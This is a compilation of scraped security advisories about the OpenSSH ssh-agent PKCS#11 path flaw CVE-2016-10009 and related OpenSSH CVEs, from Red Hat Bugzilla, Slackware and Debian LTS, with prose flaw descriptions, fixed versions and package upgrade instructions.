| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-10009 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1406296](show_bug.cgi?id=1406296 "CLOSED ERRATA - CVE-2016-10009 CVE-2016-10010 CVE-2016-10011 CVE-2016-10012 openssh: various flaws [fedora-all]") [1794507](show_bug.cgi?id=1794507) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1406299](show_bug.cgi?id=1406299) [1415638](show_bug.cgi?id=1415638) | | TreeView+ | [depends on](buglist.cgi?bug_id=1406269&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1406269&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2016-12-20 07:40 UTC by Martin Prpi | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-03-11 14:52 UTC ([History](show_activity.cgi?id=1406269)) | | [CC List:](page.cgi?id=fields.html#cclist) | 8 users (show)  jjelen mattias.ellert mgrepl plautrba sardella slawomir tmraz yozone | | Fixed In Version: | openssh 7.4 | | | Doc Type: | If docs needed, set a value | | | Doc Text: | It was found that ssh-agent could load PKCS#11 modules from arbitrary paths. An attacker having control of the forwarded agent-socket on the server, and the ability to write to the filesystem of the client host, could use this flaw to execute arbitrary code with the privileges of the user running ssh-agent. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2017-01-16 05:55:09 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2017:2029](https://access.redhat.com/errata/RHSA-2017%3A2029) | 0 | normal | SHIPPED\_LIVE | Moderate: openssh security, bug fix, and enhancement update | 2017-08-01 18:11:55 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1406269#c0)  Martin Prpi    2016-12-20 07:40:41 UTC  ``` It was found that ssh-agent could load PKCS#11 modules from paths outside of a trusted whitelist. An attacker able to load a crafted PKCS#11 module across a forwarded agent channel could potentially use this flaw to execute arbitrary code on the system running the ssh-agent. Note that the attacker must have control of the forwarded agent-socket and the ability to write to the filesystem of the host running ssh-agent.  This issue was fixed by only allowing the loading of module from a trusted (and configurable) whitelist.  CVE assignment:  <http://seclists.org/oss-sec/2016/q4/708>  Upstream patch:  <http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.214&r2=1.215&sortby=date&f=h>   ```  [Comment 1](show_bug.cgi?id=1406269#c1)  Martin Prpi    2016-12-20 07:40:58 UTC  ``` External References:  <https://www.openssh.com/txt/release-7.4>   ```  [Comment 2](show_bug.cgi?id=1406269#c2)  Andrej Nemec    2016-12-20 08:41:15 UTC  ```  Created openssh tracking bugs for this issue:  Affects: fedora-all [[bug 1406296](show_bug.cgi?id=1406296 "CLOSED ERRATA - CVE-2016-10009 CVE-2016-10010 CVE-2016-10011 CVE-2016-10012 openssh: various flaws [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1406269#c3)  Jakub Jelen    2017-01-03 14:38:10 UTC  ``` If we will want to fix it, we need to change the whitelist to something reasonable, because all of our PKCS#11 libraries are on x68_64 under /usr/lib64/ See the upstream discussion:  <http://lists.mindrot.org/pipermail/openssh-unix-dev/2017-January/035631.html>   ```  [Comment 4](show_bug.cgi?id=1406269#c4)  Huzaifa S. Sidhpurwala    2017-01-16 05:55:09 UTC  ``` Statement:  In order to exploit this flaw, the attacker needs to have control of the forwarded agent-socket and the ability to write to the filesystem of the host running ssh-agent. Because of this restriction for successful exploitation, this issue has been rated as having Moderate security impact. A future update may address this flaw.   ```  [Comment 5](show_bug.cgi?id=1406269#c5)  errata-xmlrpc    2017-08-01 18:45:28 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2017:2029 [https://access.redhat.com/errata/RHSA-2017:2029](https://access.redhat.com/errata/RHSA-2017%3A2029)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1406269&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.slackware.com_4fa26720_20250125_102959.html ===


| | | | **Slackware Security Advisories** | | --- | | | --- | --- | | | | [Slackware Logo](/index.html) | | --- | | | --- | --- | | | --- | --- | --- | --- | --- | --- | |  | | | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| | | **[News](/index.php)** | | --- | | | --- | --- |  | | **[Security Advisories](/security/)** | | --- | | | --- | --- |  | | **[FAQ](/faq/) [Book](/book/) [General Info](/info/) [Get Slack](/getslack/) [Install Help](/install/) [Configuration](/config/) [Packages](/packages/) [ChangeLogs](/changelog/) [Propaganda](/~msimons/slackware/grfx/) [Ports](/ports/) [Other Sites](/links/) [Support](/support/) [Contact](/contact/) [Mailing Lists](/lists/) [About](/about/)** | | --- | | | --- | --- | |  | | | **From:** Slackware Security Team <security@slackware.com> | | --- | | | --- | --- |  | | ```  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  [slackware-security]  openssh (SSA:2016-358-02)  New openssh packages are available for Slackware 13.0, 13.1, 13.37, 14.0, 14.1, 14.2, and -current to fix security issues.   Here are the details from the Slackware 14.2 ChangeLog: +--------------------------+ patches/packages/openssh-7.4p1-i586-1_slack14.2.txz:  Upgraded.   This is primarily a bugfix release, and also addresses security issues.   ssh-agent(1): Will now refuse to load PKCS#11 modules from paths outside     a trusted whitelist.   sshd(8): When privilege separation is disabled, forwarded Unix-domain     sockets would be created by sshd(8) with the privileges of 'root'.   sshd(8): Avoid theoretical leak of host private key material to     privilege-separated child processes via realloc().   sshd(8): The shared memory manager used by pre-authentication compression     support had a bounds checks that could be elided by some optimising     compilers to potentially allow attacks against the privileged monitor.     process from the sandboxed privilege-separation process.   sshd(8): Validate address ranges for AllowUser and DenyUsers directives at     configuration load time and refuse to accept invalid ones.  It was     previously possible to specify invalid CIDR address ranges     (e.g. user@127.1.2.3/55) and these would always match, possibly resulting     in granting access where it was not intended.   For more information, see:     https://www.openssh.com/txt/release-7.4     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10009     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10010     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10011     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10012   (* Security fix *) +--------------------------+   Where to find the new packages: +-----------------------------+  Thanks to the friendly folks at the OSU Open Source Lab (http://osuosl.org) for donating FTP and rsync hosting to the Slackware project!  :-)  Also see the "Get Slack" section on http://slackware.com for additional mirror sites near you.  Updated package for Slackware 13.0: ftp://ftp.slackware.com/pub/slackware/slackware-13.0/patches/packages/openssh-7.4p1-i486-1_slack13.0.txz  Updated package for Slackware x86_64 13.0: ftp://ftp.slackware.com/pub/slackware/slackware64-13.0/patches/packages/openssh-7.4p1-x86_64-1_slack13.0.txz  Updated package for Slackware 13.1: ftp://ftp.slackware.com/pub/slackware/slackware-13.1/patches/packages/openssh-7.4p1-i486-1_slack13.1.txz  Updated package for Slackware x86_64 13.1: ftp://ftp.slackware.com/pub/slackware/slackware64-13.1/patches/packages/openssh-7.4p1-x86_64-1_slack13.1.txz  Updated package for Slackware 13.37: ftp://ftp.slackware.com/pub/slackware/slackware-13.37/patches/packages/openssh-7.4p1-i486-1_slack13.37.txz  Updated package for Slackware x86_64 13.37: ftp://ftp.slackware.com/pub/slackware/slackware64-13.37/patches/packages/openssh-7.4p1-x86_64-1_slack13.37.txz  Updated package for Slackware 14.0: ftp://ftp.slackware.com/pub/slackware/slackware-14.0/patches/packages/openssh-7.4p1-i486-1_slack14.0.txz  Updated package for Slackware x86_64 14.0: ftp://ftp.slackware.com/pub/slackware/slackware64-14.0/patches/packages/openssh-7.4p1-x86_64-1_slack14.0.txz  Updated package for Slackware 14.1: ftp://ftp.slackware.com/pub/slackware/slackware-14.1/patches/packages/openssh-7.4p1-i486-1_slack14.1.txz  Updated package for Slackware x86_64 14.1: ftp://ftp.slackware.com/pub/slackware/slackware64-14.1/patches/packages/openssh-7.4p1-x86_64-1_slack14.1.txz  Updated package for Slackware 14.2: ftp://ftp.slackware.com/pub/slackware/slackware-14.2/patches/packages/openssh-7.4p1-i586-1_slack14.2.txz  Updated package for Slackware x86_64 14.2: ftp://ftp.slackware.com/pub/slackware/slackware64-14.2/patches/packages/openssh-7.4p1-x86_64-1_slack14.2.txz  Updated package for Slackware -current: ftp://ftp.slackware.com/pub/slackware/slackware-current/slackware/n/openssh-7.4p1-i586-1.txz  Updated package for Slackware x86_64 -current: ftp://ftp.slackware.com/pub/slackware/slackware64-current/slackware64/n/openssh-7.4p1-x86_64-1.txz   MD5 signatures: +-------------+  Slackware 13.0 package: 7fce1ebdb63b97beaeb98f450676171c  openssh-7.4p1-i486-1_slack13.0.txz  Slackware x86_64 13.0 package: 26fbf1aa33f5b289b15435a904b5d2a0  openssh-7.4p1-x86_64-1_slack13.0.txz  Slackware 13.1 package: 5b8a87019ca527acba1f607af9175cfb  openssh-7.4p1-i486-1_slack13.1.txz  Slackware x86_64 13.1 package: 29aa129063c2667612485edeac5c072b  openssh-7.4p1-x86_64-1_slack13.1.txz  Slackware 13.37 package: 6d9aabce1fc85756b7863cbf1cf389a9  openssh-7.4p1-i486-1_slack13.37.txz  Slackware x86_64 13.37 package: e57e264dccefc2621bd45838d96bb10d  openssh-7.4p1-x86_64-1_slack13.37.txz  Slackware 14.0 package: 7613f561db6b8616ec2b0a283e4487d6  openssh-7.4p1-i486-1_slack14.0.txz  Slackware x86_64 14.0 package: 7a834d8b295da5ea88bac1340e359711  openssh-7.4p1-x86_64-1_slack14.0.txz  Slackware 14.1 package: 45c8e0c84e13d0c0a9914087898cefbd  openssh-7.4p1-i486-1_slack14.1.txz  Slackware x86_64 14.1 package: 8e66d220fb2c3da97bf912a487436ac6  openssh-7.4p1-x86_64-1_slack14.1.txz  Slackware 14.2 package: 690e285ce2aeeee6f670451034ae3ec6  openssh-7.4p1-i586-1_slack14.2.txz  Slackware x86_64 14.2 package: 6a2b3846149a9f8071f2751aed452f53  openssh-7.4p1-x86_64-1_slack14.2.txz  Slackware -current package: e0d8576b19ebe4da64f5d72474693295  n/openssh-7.4p1-i586-1.txz  Slackware x86_64 -current package: 1a8bbe8129a9c28fb9eb98b202646b46  n/openssh-7.4p1-x86_64-1.txz   Installation instructions: +------------------------+  Upgrade the package as root: # upgradepkg openssh-7.4p1-i586-1_slack14.2.txz  Next, restart the sshd daemon: # sh /etc/rc.d/rc.sshd restart   +-----+  Slackware Linux Security Team http://slackware.com/gpg-key security@slackware.com  +------------------------------------------------------------------------+ | To leave the slackware-security mailing list:                          | +------------------------------------------------------------------------+ | Send an email to majordomo@slackware.com with this text in the body of | | the email message:                                                     | |                                                                        | |   unsubscribe slackware-security                                       | |                                                                        | | You will get a confirmation message back containing instructions to    | | complete the process.  Please do not reply to this email address.      | +------------------------------------------------------------------------+ -----BEGIN PGP SIGNATURE-----  iEYEARECAAYFAlhd0CQACgkQakRjwEAQIjOtFACfWbK3WHi9hnOvSJgupjBdsrtE e7MAn3rZ5dK+y872B6oqqF07GWTw5bBG =3YjQ -----END PGP SIGNATURE-----   ``` | | --- | | | --- | --- | |
|

 | | Slackware is a **[trademark](http://slackware.com/trademark/trademark.php)** of Patrick Volkerding. | | --- | | | --- | --- | | | |



=== Content from lists.debian.org_3c86b23e_20250125_103001.html ===


---

[[Date Prev](msg00009.html)][[Date Next](msg00011.html)]
[[Thread Prev](msg00009.html)][[Thread Next](msg00011.html)]
[[Date Index](maillist.html#00010)]
[[Thread Index](threads.html#00010)]

# [SECURITY] [DLA 1500-1] openssh security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1500-1] openssh security update
* *From*: "Santiago R.R." <santiagorr@riseup.net>
* *Date*: Mon, 10 Sep 2018 10:44:17 +0200
* *Message-id*: <[[]](/msgid-search/20180910084417.GA30109%40novelo)[20180910084417.GA30109@novelo](msg00010.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
Package        : openssh
Version        : 1:6.7p1-5+deb8u6
CVE ID         : CVE-2015-5352 CVE-2015-5600 CVE-2015-6563 CVE-2015-6564
                 CVE-2016-1908 CVE-2016-3115 CVE-2016-6515 CVE-2016-10009
                 CVE-2016-10011 CVE-2016-10012 CVE-2016-10708
                 CVE-2017-15906
Debian Bug     : 790798 793616 795711 848716 848717

Several vulnerabilities have been found in OpenSSH, a free implementation
of the SSH protocol suite:

CVE-2015-5352

    OpenSSH incorrectly verified time window deadlines for X connections.
    Remote attackers could take advantage of this flaw to bypass intended
    access restrictions. Reported by Jann Horn.

CVE-2015-5600

    OpenSSH improperly restricted the processing of keyboard-interactive
    devices within a single connection, which could allow remote attackers
    to perform brute-force attacks or cause a denial of service, in a
    non-default configuration.

CVE-2015-6563

    OpenSSH incorrectly handled usernames during PAM authentication. In
    conjunction with an additional flaw in the OpenSSH unprivileged child
    process, remote attackers could make use if this issue to perform user
    impersonation. Discovered by Moritz Jodeit.

CVE-2015-6564

    Moritz Jodeit discovered a use-after-free flaw in PAM support in
    OpenSSH, that could be used by remote attackers to bypass
    authentication or possibly execute arbitrary code.

CVE-2016-1908

    OpenSSH mishandled untrusted X11 forwarding when the X server disables
    the SECURITY extension. Untrusted connections could obtain trusted X11
    forwarding privileges. Reported by Thomas Hoger.

CVE-2016-3115

    OpenSSH improperly handled X11 forwarding data related to
    authentication credentials. Remote authenticated users could make use
    of this flaw to bypass intended shell-command restrictions. Identified
    by github.com/tintinweb.

CVE-2016-6515

    OpenSSH did not limit password lengths for password authentication.
    Remote attackers could make use of this flaw to cause a denial of
    service via long strings.

CVE-2016-10009

    Jann Horn discovered an untrusted search path vulnerability in
    ssh-agent allowing remote attackers to execute arbitrary local
    PKCS#11 modules by leveraging control over a forwarded agent-socket.

CVE-2016-10011

    Jann Horn discovered that OpenSSH did not properly consider the
    effects of realloc on buffer contents. This may allow local users to
    obtain sensitive private-key information by leveraging access to a
    privilege-separated child process.

CVE-2016-10012

    Guido Vranken discovered that the OpenSSH shared memory manager
    did not ensure that a bounds check was enforced by all compilers,
    which could allow local users to gain privileges by leveraging access
    to a sandboxed privilege-separation process.

CVE-2016-10708

    NULL pointer dereference and daemon crash via an out-of-sequence
    NEWKEYS message.

CVE-2017-15906

    Michal Zalewski reported that OpenSSH improperly prevent write
    operations in readonly mode, allowing attackers to create zero-length
    files.

For Debian 8 "Jessie", these problems have been fixed in version
1:6.7p1-5+deb8u6.

We recommend that you upgrade your openssh packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

```

**Attachment:
[signature.asc](pgpeHaCp_zwZM.pgp)**

*Description:* PGP signature

---



=== Content from support.hpe.com_e48adfac_20250125_103004.html ===




=== Content from packetstormsecurity.com_bf1537f0_20250125_102956.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.redhat.com_c3acdf00_20250126_080147.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_d9928662_20250126_080203.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
